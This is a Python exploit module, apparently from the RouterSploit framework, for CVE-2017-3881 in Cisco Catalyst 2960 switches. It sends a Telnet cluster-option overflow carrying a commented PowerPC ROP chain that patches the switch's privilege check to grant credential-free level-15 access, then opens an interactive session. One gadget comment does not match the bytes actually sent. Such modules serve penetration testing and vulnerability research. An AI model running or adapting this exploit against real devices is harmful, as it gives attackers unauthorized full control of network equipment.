import socket
import telnetlib

from routersploit import (
    exploits,
    print_status,
    print_error,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco Catalyst 2960 IOS 12.2(55)SE11 'ROCEM' RCE vulnerability.
    If target is vulnerable, it is possible to patch execution flow to allow credless telnet
    interaction with highest privilege level.
    """
    __info__ = {
        'name': 'Cisco Catalyst 2960 ROCEM RCE',
        'description': 'Module exploits Cisco Catalyst 2960 ROCEM RCE vulnerability. '
                       'If target is vulnerable, it is possible to patch execution flow '
                       'to allow credless telnet interaction with highest privilege level.',
        'authors': [
            'Artem Kondratenko <@artkond>',  # analysis & python exploit
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ],
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3881',
            'https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/',
            'https://www.exploit-db.com/exploits/41872/',
        ],
        'devices': [
            'Cisco Catalyst 2960 IOS 12.2(55)SE11',
        ],
    }

    target = exploits.Option('', 'Target IP address', validators=validators.ipv4)
    port = exploits.Option(23, 'Target Port')

    action = exploits.Option('unset', 'Set / Unset password for Telnet service')

    def run(self):
        set_credless = True if self.action == 'set' else False

        print_status("Trying to connect to Telnet service on port {}".format(self.port))

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, int(self.port)))

            print_status("Connection OK")
            print_status("Received bytes from telnet service: {}".format(repr(s.recv(1024))))
        except:
            print_error("Connection failed")
            return

        print_status("Building payload...")

        if set_credless:
            print_status("Setting credless privilege 15 authentication")
        else:
            print_status("Unsetting credless privilege 15 authentication")

        payload = "\xff\xfa\x24\x00"
        payload += "\x03CISCO_KITS\x012:"
        payload += "A" * 116
        # first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
        payload += "\x00\x00\x37\xb4"
        # next bytes are shown as offsets from r1
        # +8  address of pointer to is_cluster_mode function - 0x34
        payload += "\x02\x3d\x55\xdc"

        if set_credless:
            # +12 set  address of func that rets 1
            payload += "\x00\x00\x99\x9c"
        else:
            # unset
            payload += "\x00\x04\xea\xe0"

        # +16(+0) r1 points here at second gadget
        payload += "BBBB"
        # +4 second gadget address 0x00e1a9f4: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
        payload += "\x00\xe1\xa9\xf4"
        # +8
        payload += "CCCC"
        # +12
        payload += "DDDD"
        # +16(+0) r1 points here at third gadget
        payload += "EEEE"
        # +20(+4) third gadget address. 0x00067b5c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr;
        payload += "\x00\x06\x7b\x5c"
        # +8  r1+8 = 0x23d55c8
        payload += "\x02\x3d\x55\xc8"
        # +12
        payload += "FFFF"
        # +16(+0) r1 points here at fourth gadget
        payload += "GGGG"
        # +20(+4) fourth gadget address 0x006cb3a0: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
        payload += "\x00\x6c\xb3\xa0"

        if set_credless:
            # +8 address of the replacing function that returns 15 (our desired privilege level). 0x00270b94: li r3, 0xf; blr;
            payload += "\x00\x27\x0b\x94"
        else:
            # unset
            payload += "\x00\x04\xe7\x78"

        # +12
        payload += "HHHH"
        # +16(+0) r1 points here at fifth gadget
        payload += "IIII"
        # +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
        payload += "\x01\x4a\xcf\x98"
        # +8 r1 points here at third gadget
        payload += "JJJJ"
        # +12
        payload += "KKKK"
        # +16
        payload += "LLLL"
        # +20 original execution flow return addr
        payload += "\x01\x14\xe7\xec"
        payload += ":15:" + "\xff\xf0"

        print_status("Sending cluster option")
        s.send(payload)
        s.close()

        print_status("Payload sent")

        if set_credless:
            print_status("Check if Telnet authentication was set back")
        else:
            print_status("Connecting to Telnet service...")
            try:
                t = telnetlib.Telnet(self.target, int(self.port))
                t.interact()
            except:
                print_error("Exploit failed")

    @mute
    def check(self):
        # it is not possible to verify if target is vulnerable without exploiting system
        return None
